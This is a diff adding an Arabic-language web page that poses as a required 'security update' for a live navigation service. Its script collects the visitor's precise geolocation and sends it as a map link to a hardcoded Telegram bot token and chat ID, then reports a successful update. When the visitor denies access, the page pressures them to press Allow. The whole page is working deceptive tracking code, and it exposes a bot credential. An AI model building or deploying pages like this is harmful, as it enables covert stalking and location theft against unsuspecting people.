@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث الخدمة</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 350px; }
+        button { background-color: #0088cc; color: white; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-size: 18px; font-weight: bold; width: 100%; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h3>تحديث أمني مطلوب</h3>
+        <p>يرجى السماح بالوصول للموقع لتأكيد هويتك وتفعيل خدمة الملاحة الحية.</p>
+        <button onclick="startTracking()">تحديث الآن</button>
+    </div>
+
+    <script>
+        const token = "8535362156:AAEPvMS4o_DQUOuGPlP2Gv2OABQ1CvEY35A"; 
+        const chatId = "1823604792"; 
+
+        function startTracking() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendToTelegram, showError, { enableHighAccuracy: true });
+                alert("جاري التحقق.. انتظر لحظة");
+            } else {
+                alert("المتصفح لا يدعم الموقع.");
+            }
+        }
+
+        function sendToTelegram(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const message = `📍 موقع جديد وصل يا خالد:\n${mapLink}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url).then(res => { if(res.ok) alert("تم التحديث بنجاح!"); });
+        }
+
+        function showError(error) { alert("لازم تدوس Allow عشان يشتغل"); }
+    </script>
+</body>
+</html>
